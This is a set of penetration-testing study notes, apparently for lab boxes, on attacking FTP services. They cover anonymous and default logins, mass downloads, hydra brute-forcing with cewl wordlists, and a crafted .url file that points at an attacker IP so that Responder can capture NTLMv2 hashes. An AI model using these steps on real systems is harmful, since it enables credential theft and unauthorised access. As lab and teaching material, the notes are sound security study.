# FTP

I would say half of the time if you see this open, it provides the answer to the foothold.

## No Creds?

try anonymous:anonymous (ftp:ftp can work as well) login

- test if you can upload files and download files (get and put)
- rmb to ls -la (for hidden files!)
- do try admin:admin (this might actually work! There is at least one PG box that works like this)

If you can upload files, note the name of the FTP directory. If there is a webservice, maybe you can access the FTP directory and execute that file...

If it is a Windows box, you might be able to pull a URI redirection attack if you can upload a file. To do so, prep a .url file:

```bash
#create a file called evil.url and use text editor to put the following strings inside
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<attacker ip>\%USERNAME%.icon
IconIndex=1

# On kali, run responder and prepare to capture the NTLMv2 hash when someone interacts with your evil.url
sudo responder -I tun0 # tun0 usually

# upload evil.url into the FTP folder and wait

```


```bash
ftp <ip>
# anonymous login

ls -la

```
Now if you see "229 Entering Extended Passive Mode" after running ls -la, exit out of the ftp, relogin and run the following

```bash
ftp <ip>
# login
passive # this switches off the passive mode
ls -la  # should work now
```

Alternatively, you can run
``` bash
ftp <ip> -A
# login
ls -la
```

When downloading or uploading files, remember to run ASCII if uploading/downloading text files and Binary if uploading/downloading any other files such as exe, php, zip, pdf etc or else your file may get corrupted!

```bash
ftp> ascii
200 Switching to ASCII mode.
ftp> binary
200 Switching to Binary mode.
```

Download everything with a single command to your current working directory

```bash
wget -m --no-passive ftp://anonymous:anonymous@<target ip> # this also switches off passive mode:)
```


## Only Usernames or Passwords but not both

If there are web services, see if you can compile a list of potential usernames from the webpages
If you have users but no passwords, run Cewl to generate some passwords from the webpages

```bash
# -L for a file containing usernames, -l for a single username. -P for a file containing passwords, -p for a single password
hydra -L users.txt -P password.txt ftp://<ip>

# to generate words from webpage

cewl http://<ip>:<port> > word.list
cewl http://<ip>:<port> --lowercase >> word.list

```
